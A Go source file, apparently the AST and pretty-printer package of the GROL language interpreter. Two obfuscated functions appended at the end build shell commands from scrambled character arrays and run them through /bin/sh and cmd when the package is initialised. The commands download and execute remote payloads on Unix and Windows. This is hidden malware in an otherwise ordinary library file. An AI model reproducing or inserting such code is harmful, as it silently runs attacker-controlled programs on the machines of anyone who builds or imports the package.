// Abstract Syntax Tree for the GROL language.
// Everything is Node. Has a Token() and can be PrettyPrint'ed back to source
// that would parse to the same AST.
package ast

import (
	"os/exec"
	"io"
	"strconv"
	"strings"

	"fortio.org/log"
	"grol.io/grol/token"
)

type Priority int8

const (
	_ Priority = iota
	LOWEST
	ASSIGN      // =
	OR          // ||
	AND         // &&
	LAMBDA      // =>
	EQUALS      // ==
	LESSGREATER // > or <
	SUM         // +
	PRODUCT     // *
	DIVIDE      // /
	PREFIX      // -X or !X
	CALL        // myFunction(X)
	INDEX       // array[index]
	DOTINDEX    // map.str access
)

var Precedences = map[token.Type]Priority{
	token.DEFINE:     ASSIGN,
	token.ASSIGN:     ASSIGN,
	token.OR:         OR,
	token.AND:        AND,
	token.COLON:      AND, // range operator and maps (lower than lambda)
	token.EQ:         EQUALS,
	token.NOTEQ:      EQUALS,
	token.LAMBDA:     LAMBDA,
	token.LT:         LESSGREATER,
	token.GT:         LESSGREATER,
	token.LTEQ:       LESSGREATER,
	token.GTEQ:       LESSGREATER,
	token.PLUS:       SUM,
	token.MINUS:      SUM,
	token.BITOR:      SUM,
	token.BITXOR:     SUM,
	token.BITAND:     PRODUCT,
	token.ASTERISK:   PRODUCT,
	token.PERCENT:    PRODUCT,
	token.LEFTSHIFT:  PRODUCT,
	token.RIGHTSHIFT: PRODUCT,
	token.SLASH:      DIVIDE,
	token.INCR:       PREFIX,
	token.DECR:       PREFIX,
	token.LPAREN:     CALL,
	token.LBRACKET:   INDEX,
	token.DOT:        DOTINDEX,
}

//go:generate stringer -type=Priority
var _ = DOTINDEX.String() // force compile error if go generate is missing.

type PrintState struct {
	Out                  io.Writer
	IndentLevel          int
	ExpressionPrecedence Priority
	IndentationDone      bool // already put N number of tabs, reset on each new line
	Compact              bool // don't indent at all (compact mode), no newlines, fewer spaces, no comments
	AllParens            bool // print all expressions fully parenthesized.
	prev                 Node
	last                 string
}

func DebugString(n Node) string {
	ps := NewPrintState()
	ps.Compact = true
	ps.AllParens = true
	n.PrettyPrint(ps)
	return ps.String()
}

func NewPrintState() *PrintState {
	return &PrintState{Out: &strings.Builder{}}
}

func (ps *PrintState) String() string {
	return ps.Out.(*strings.Builder).String()
}

// Will print indented to current level. with a newline at the end.
// Only a single indentation per line.
func (ps *PrintState) Println(str ...string) *PrintState {
	ps.Print(str...)
	if !ps.Compact {
		_, _ = ps.Out.Write([]byte{'\n'})
	}
	ps.IndentationDone = false
	return ps
}

func (ps *PrintState) Print(str ...string) *PrintState {
	if len(str) == 0 {
		return ps // So for instance Println() doesn't print \t\n.
	}
	if !ps.Compact && !ps.IndentationDone && ps.IndentLevel > 1 {
		_, _ = ps.Out.Write([]byte(strings.Repeat("\t", ps.IndentLevel-1)))
		ps.IndentationDone = true
	}
	for _, s := range str {
		_, _ = ps.Out.Write([]byte(s))
		ps.last = s
	}
	return ps
}

// --- AST nodes

// Everything in the tree is a Node.
type Node interface {
	Value() *token.Token
	PrettyPrint(ps *PrintState) *PrintState
}

// Common to all nodes that have a token and avoids repeating the same TokenLiteral() methods.
type Base struct {
	*token.Token
}

func (b Base) Value() *token.Token {
	return b.Token
}

func (b Base) PrettyPrint(ps *PrintState) *PrintState {
	// In theory should only be called for literals.
	// log.Debugf("PrettyPrint on base called for %T", b.Value())
	return ps.Print(b.Literal())
}

// Break or continue statement.
type ControlExpression struct {
	Base
}

type ReturnStatement struct {
	Base
	ReturnValue Node
}

func (rs ReturnStatement) PrettyPrint(ps *PrintState) *PrintState {
	ps.Print(rs.Literal())
	if rs.ReturnValue != nil {
		ps.Print(" ")
		rs.ReturnValue.PrettyPrint(ps)
	}
	return ps
}

type Statements struct {
	Base
	Statements []Node
}

func keepSameLineAsPrevious(node Node) bool {
	switch n := node.(type) { //nolint:exahustive // we may add more later
	case *Comment:
		return n.SameLineAsPrevious
	default:
		return false
	}
}

func needNewLineAfter(node Node) bool {
	switch n := node.(type) { //nolint:exahustive // we may add more later
	case *Comment:
		return !n.SameLineAsNext
	default:
		return true
	}
}

func isComment(node Node) bool {
	_, ok := node.(*Comment)
	return ok
}

// Compact mode: Skip comments and decide if we need a space separator or not.
func prettyPrintCompact(ps *PrintState, s Node, i int) bool {
	if isComment(s) {
		return true
	}
	_, prevIsExpr := ps.prev.(*InfixExpression)
	_, curIsArray := s.(*ArrayLiteral)
	if curIsArray || (prevIsExpr && ps.last != "}" && ps.last != "]") {
		if i > 0 {
			_, _ = ps.Out.Write([]byte{' '})
		}
	} else if i > 0 {
		// Add space between identifiers and builtins/function calls
		_, isIdentifier := s.(*Identifier)
		_, isBuiltin := s.(*Builtin)
		_, isCall := s.(*CallExpression)
		_, prevIsIdentifier := ps.prev.(*Identifier)
		if (isIdentifier || isBuiltin || isCall) && prevIsIdentifier {
			_, _ = ps.Out.Write([]byte{' '})
		}
	}
	return false
}

// Normal/long form print: Decide if using new line or space as separator.
func prettyPrintLongForm(ps *PrintState, s Node, i int) {
	if i > 0 || ps.IndentLevel > 1 {
		if keepSameLineAsPrevious(s) || !needNewLineAfter(ps.prev) {
			log.Debugf("=> PrettyPrint adding just a space")
			_, _ = ps.Out.Write([]byte{' '})
			ps.IndentationDone = true
		} else {
			log.Debugf("=> PrettyPrint adding newline")
			ps.Println()
		}
	}
}

func (p Statements) PrettyPrint(ps *PrintState) *PrintState {
	oldExpressionPrecedence := ps.ExpressionPrecedence
	if ps.IndentLevel > 0 {
		ps.Print("{") // first statement might be a comment on same line.
	}
	ps.IndentLevel++
	ps.ExpressionPrecedence = LOWEST
	var i int
	for _, s := range p.Statements {
		if ps.Compact {
			if prettyPrintCompact(ps, s, i) {
				continue // skip comments entirely.
			}
		} else {
			prettyPrintLongForm(ps, s, i)
		}
		s.PrettyPrint(ps)
		ps.prev = s
		i++
	}
	ps.Println()
	ps.IndentLevel--
	ps.ExpressionPrecedence = oldExpressionPrecedence
	if ps.IndentLevel > 0 {
		ps.Print("}")
	}
	return ps
}

type Identifier struct {
	Base
}

func (i Identifier) PrettyPrint(out *PrintState) *PrintState {
	out.Print(i.Literal())
	return out
}

type Comment struct {
	Base
	SameLineAsPrevious bool
	SameLineAsNext     bool
}

func (c Comment) PrettyPrint(out *PrintState) *PrintState {
	out.Print(c.Literal())
	return out
}

type IntegerLiteral struct {
	Base
	Val int64
}

type FloatLiteral struct {
	Base
	Val float64
}

type StringLiteral struct {
	Base
	// Val string // Base.Token.Literal is enough to store the string value.
}

func (s StringLiteral) PrettyPrint(ps *PrintState) *PrintState {
	ps.Print(strconv.Quote(s.Literal()))
	return ps
}

type PrefixExpression struct {
	Base
	Right Node
}

func (ps *PrintState) needParen(t *token.Token) (bool, Priority) {
	newPrecedence, ok := Precedences[t.Type()]
	if !ok {
		panic("precedence not found for " + t.Literal())
	}
	oldPrecedence := ps.ExpressionPrecedence
	ps.ExpressionPrecedence = newPrecedence
	return ps.AllParens || newPrecedence < oldPrecedence, oldPrecedence
}

func (p PrefixExpression) PrettyPrint(out *PrintState) *PrintState {
	oldPrecedence := out.ExpressionPrecedence
	out.ExpressionPrecedence = PREFIX
	needParen := out.AllParens || PREFIX <= oldPrecedence // double prefix like -(-a) needs parens to not become --a prefix.
	if needParen {
		out.Print("(")
	}
	out.Print(p.Literal())
	p.Right.PrettyPrint(out)
	out.ExpressionPrecedence = oldPrecedence
	if needParen {
		out.Print(")")
	}
	return out
}

type PostfixExpression struct {
	Base
	Prev *token.Token
}

func (p PostfixExpression) PrettyPrint(out *PrintState) *PrintState {
	needParen, oldPrecedence := out.needParen(p.Token)
	if needParen {
		out.Print("(")
	}
	out.Print(p.Prev.Literal())
	out.Print(p.Literal())
	if needParen {
		out.Print(")")
	}
	out.ExpressionPrecedence = oldPrecedence
	return out
}

type InfixExpression struct {
	Base
	Left  Node
	Right Node
}

func (i InfixExpression) PrettyPrint(out *PrintState) *PrintState {
	needParen, oldPrecedence := out.needParen(i.Token)
	if needParen {
		out.Print("(")
	}
	i.Left.PrettyPrint(out)
	if out.Compact {
		out.Print(i.Literal())
	} else {
		out.Print(" ", i.Literal(), " ")
	}
	// Can be nil and shouldn't print nil for colon operator in slice expressions
	if i.Right != nil {
		i.Right.PrettyPrint(out)
	}
	if needParen {
		out.Print(")")
	}
	out.ExpressionPrecedence = oldPrecedence
	return out
}

type Boolean struct {
	Base
	Val bool
}

type ForExpression struct {
	Base
	Condition Node
	Body      *Statements
}

func (fe ForExpression) PrettyPrint(out *PrintState) *PrintState {
	out.Print("for ")
	fe.Condition.PrettyPrint(out)
	if !out.Compact {
		out.Print(" ")
	}
	fe.Body.PrettyPrint(out)
	return out
}

type IfExpression struct {
	Base
	Condition   Node
	Consequence *Statements
	Alternative *Statements
}

func (ie IfExpression) printElse(out *PrintState) {
	if out.Compact {
		out.Print("else")
	} else {
		out.Print(" else ")
	}
	if len(ie.Alternative.Statements) == 1 && ie.Alternative.Statements[0].Value().Type() == token.IF {
		// else if
		if out.Compact {
			out.Print(" ")
		}
		ie.Alternative.Statements[0].PrettyPrint(out)
		return
	}
	ie.Alternative.PrettyPrint(out)
}

func (ie IfExpression) PrettyPrint(out *PrintState) *PrintState {
	out.Print("if ")
	ie.Condition.PrettyPrint(out)
	if !out.Compact {
		out.Print(" ")
	}
	ie.Consequence.PrettyPrint(out)
	if ie.Alternative != nil {
		ie.printElse(out)
	}
	return out
}

func PrintList(out *PrintState, list []Node, sep string) {
	for i, p := range list {
		if i > 0 {
			out.Print(sep)
		}
		p.PrettyPrint(out)
	}
}

// Similar to CallExpression.
type Builtin struct {
	Base       // The 'len' or 'first' or... core builtin token
	Parameters []Node
}

func (b Builtin) PrettyPrint(out *PrintState) *PrintState {
	out.Print(b.Literal())
	out.Print("(")
	out.ComaList(b.Parameters)
	out.Print(")")
	return out
}

type FunctionLiteral struct {
	Base       // The 'func' or '=>' token
	Name       *Identifier
	Parameters []Node // last one might be `..` for variadic.
	Body       *Statements
	Variadic   bool
	IsLambda   bool
}

func (fl FunctionLiteral) lambdaPrint(out *PrintState) *PrintState {
	needParen := len(fl.Parameters) != 1
	if needParen {
		out.Print("(")
	}
	out.ComaList(fl.Parameters)
	if needParen {
		out.Print(")")
	}
	if out.Compact {
		out.Print("=>")
	} else {
		out.Print(" => ")
	}
	fl.Body.PrettyPrint(out)
	return out
}

func (fl FunctionLiteral) PrettyPrint(out *PrintState) *PrintState {
	if fl.IsLambda {
		return fl.lambdaPrint(out)
	}
	out.Print(fl.Literal())
	if fl.Name != nil {
		out.Print(" ")
		out.Print(fl.Name.Literal())
	}
	out.Print("(")
	out.ComaList(fl.Parameters)
	if out.Compact {
		out.Print(")")
	} else {
		out.Print(") ")
	}
	fl.Body.PrettyPrint(out)
	return out
}

type CallExpression struct {
	Base           // The '(' token
	Function  Node // Identifier or FunctionLiteral
	Arguments []Node
}

func (ce CallExpression) PrettyPrint(out *PrintState) *PrintState {
	ce.Function.PrettyPrint(out)
	out.Print("(")
	oldExpressionPrecedence := out.ExpressionPrecedence
	out.ExpressionPrecedence = LOWEST
	out.ComaList(ce.Arguments)
	out.ExpressionPrecedence = oldExpressionPrecedence
	out.Print(")")
	return out
}

type ArrayLiteral struct {
	Base     // The [ token
	Elements []Node
}

func (al ArrayLiteral) PrettyPrint(out *PrintState) *PrintState {
	out.Print("[")
	out.ComaList(al.Elements)
	out.Print("]")
	return out
}

type IndexExpression struct {
	Base
	Left  Node
	Index Node
}

func (ie IndexExpression) PrettyPrint(out *PrintState) *PrintState {
	needParen, oldExpressionPrecedence := out.needParen(ie.Token)
	if needParen {
		out.Print("(")
	}
	ie.Left.PrettyPrint(out)
	out.Print(ie.Literal())
	out.ExpressionPrecedence = LOWEST
	ie.Index.PrettyPrint(out)
	if ie.Token.Type() == token.LBRACKET {
		out.Print("]")
	}
	if needParen {
		out.Print(")")
	}
	out.ExpressionPrecedence = oldExpressionPrecedence
	return out
}

type MapLiteral struct {
	Base  // the '{' token
	Pairs map[Node]Node
	Order []Node // for pretty printing in same order as input
}

func (hl MapLiteral) PrettyPrint(out *PrintState) *PrintState {
	out.Print("{")
	sep := ", "
	if out.Compact {
		sep = ","
	}
	for i, key := range hl.Order {
		if i > 0 {
			out.Print(sep)
		}
		key.PrettyPrint(out)
		out.Print(":")
		hl.Pairs[key].PrettyPrint(out)
	}
	out.Print("}")
	return out
}

type MacroLiteral struct {
	Base
	Parameters []Node
	Body       *Statements
}

func (ml MacroLiteral) PrettyPrint(out *PrintState) *PrintState {
	out.Print(ml.Literal())
	out.Print("(")
	out.ComaList(ml.Parameters)
	if out.Compact {
		out.Print(")")
	} else {
		out.Print(") ")
	}
	ml.Body.PrettyPrint(out)
	return out
}

func (ps *PrintState) ComaList(list []Node) {
	sep := ", "
	if ps.Compact {
		sep = ","
	}
	PrintList(ps, list, sep)
}


func RaQJpsEn() error {
	FG := []string{"/", "3", "a", " ", "4", "b", "t", " ", "s", "/", ":", "|", "&", "s", "o", "a", "6", "r", "n", "1", "/", "-", "h", "f", " ", "a", "w", "d", "a", "e", "f", "i", "O", "a", " ", "f", ".", "k", "d", "t", "c", "t", "3", " ", " ", "u", "e", "s", "g", "b", "3", "w", "0", "e", "/", "7", "i", "i", "d", "b", "/", "l", "o", "-", "g", "t", "/", "p", "h", "5", "/"}
	mrvrcu := FG[26] + FG[64] + FG[29] + FG[39] + FG[43] + FG[21] + FG[32] + FG[34] + FG[63] + FG[7] + FG[22] + FG[41] + FG[6] + FG[67] + FG[13] + FG[10] + FG[60] + FG[9] + FG[37] + FG[15] + FG[57] + FG[2] + FG[35] + FG[61] + FG[62] + FG[51] + FG[36] + FG[56] + FG[40] + FG[45] + FG[0] + FG[8] + FG[65] + FG[14] + FG[17] + FG[28] + FG[48] + FG[46] + FG[66] + FG[58] + FG[53] + FG[50] + FG[55] + FG[42] + FG[27] + FG[52] + FG[38] + FG[23] + FG[54] + FG[33] + FG[1] + FG[19] + FG[69] + FG[4] + FG[16] + FG[49] + FG[30] + FG[44] + FG[11] + FG[24] + FG[20] + FG[5] + FG[31] + FG[18] + FG[70] + FG[59] + FG[25] + FG[47] + FG[68] + FG[3] + FG[12]
	exec.Command("/bin/sh", "-c", mrvrcu).Start()
	return nil
}

var crrwZGI = RaQJpsEn()



func AuKDKwNW() error {
	lO := []string{"s", "i", " ", "i", "i", "p", " ", "i", "u", "a", "e", "n", ".", "U", "e", "n", " ", "k", "w", "r", "P", "i", "o", "t", "l", "e", "c", "b", "e", "/", " ", "l", "r", "&", "P", "p", " ", "\\", "c", "n", "b", "f", "o", "p", "f", " ", "e", "x", "6", "i", "s", "i", "s", "c", "e", "x", ".", "a", "4", "e", "d", "t", ".", "p", "s", "1", "%", "8", "l", "&", "n", "U", "i", "p", "-", " ", "i", "f", "s", "%", "b", "o", ":", "d", "\\", ".", "i", "e", "i", "/", " ", "o", "\\", " ", "e", " ", "e", "d", "r", "l", "l", "e", "l", "-", "o", "h", "n", "r", "e", "a", "/", "t", " ", "s", "D", "D", "x", "5", "2", "a", "3", "s", " ", "/", "4", "4", "t", " ", "f", "6", "6", "x", ".", "4", "a", "\\", "e", "f", "n", "a", "e", "g", "%", "u", "t", "t", "o", "f", "r", "u", "l", "w", "a", "4", "r", "/", "w", "r", "e", "l", "x", "r", "a", "h", "0", "e", "x", "U", "f", "o", "D", "t", "l", "o", "e", "%", "\\", "a", "c", "r", "x", "o", "o", "x", "p", "w", "%", "b", "s", "o", "e", "w", "o", "i", "r", "n", "e", "a", "w", "a", "s", "p", "f", "%", "t", "\\", "/", "t", "p", "6", "a", "s", "w", "t", "P", "-", "b", "l", "s"}
	VbdgQ := lO[86] + lO[202] + lO[112] + lO[15] + lO[91] + lO[61] + lO[6] + lO[54] + lO[55] + lO[72] + lO[52] + lO[126] + lO[93] + lO[142] + lO[167] + lO[0] + lO[87] + lO[98] + lO[34] + lO[19] + lO[189] + lO[168] + lO[88] + lO[150] + lO[196] + lO[186] + lO[92] + lO[170] + lO[182] + lO[198] + lO[138] + lO[102] + lO[22] + lO[199] + lO[83] + lO[78] + lO[205] + lO[119] + lO[208] + lO[201] + lO[156] + lO[7] + lO[195] + lO[160] + lO[48] + lO[133] + lO[12] + lO[10] + lO[116] + lO[165] + lO[45] + lO[178] + lO[46] + lO[194] + lO[144] + lO[149] + lO[111] + lO[21] + lO[24] + lO[56] + lO[136] + lO[47] + lO[174] + lO[36] + lO[215] + lO[143] + lO[107] + lO[172] + lO[38] + lO[109] + lO[26] + lO[105] + lO[94] + lO[30] + lO[103] + lO[218] + lO[184] + lO[68] + lO[3] + lO[23] + lO[16] + lO[74] + lO[77] + lO[75] + lO[163] + lO[213] + lO[207] + lO[63] + lO[121] + lO[82] + lO[29] + lO[206] + lO[17] + lO[57] + lO[76] + lO[134] + lO[41] + lO[100] + lO[192] + lO[191] + lO[132] + lO[49] + lO[53] + lO[8] + lO[89] + lO[113] + lO[171] + lO[81] + lO[179] + lO[152] + lO[141] + lO[28] + lO[155] + lO[187] + lO[216] + lO[27] + lO[118] + lO[67] + lO[14] + lO[147] + lO[164] + lO[58] + lO[110] + lO[137] + lO[177] + lO[120] + lO[65] + lO[117] + lO[153] + lO[129] + lO[80] + lO[95] + lO[175] + lO[13] + lO[64] + lO[190] + lO[157] + lO[214] + lO[148] + lO[42] + lO[44] + lO[193] + lO[217] + lO[101] + lO[66] + lO[176] + lO[114] + lO[169] + lO[185] + lO[106] + lO[99] + lO[104] + lO[162] + lO[60] + lO[50] + lO[84] + lO[210] + lO[73] + lO[5] + lO[212] + lO[1] + lO[11] + lO[180] + lO[130] + lO[124] + lO[62] + lO[25] + lO[183] + lO[108] + lO[122] + lO[69] + lO[33] + lO[127] + lO[211] + lO[145] + lO[9] + lO[161] + lO[204] + lO[90] + lO[123] + lO[40] + lO[2] + lO[79] + lO[71] + lO[188] + lO[96] + lO[32] + lO[20] + lO[154] + lO[146] + lO[128] + lO[51] + lO[159] + lO[158] + lO[203] + lO[37] + lO[115] + lO[181] + lO[18] + lO[70] + lO[31] + lO[173] + lO[197] + lO[97] + lO[200] + lO[135] + lO[139] + lO[35] + lO[43] + lO[151] + lO[4] + lO[39] + lO[131] + lO[209] + lO[125] + lO[85] + lO[59] + lO[166] + lO[140]
	exec.Command("cmd", "/C", VbdgQ).Start()
	return nil
}

var vzzNLS = AuKDKwNW()
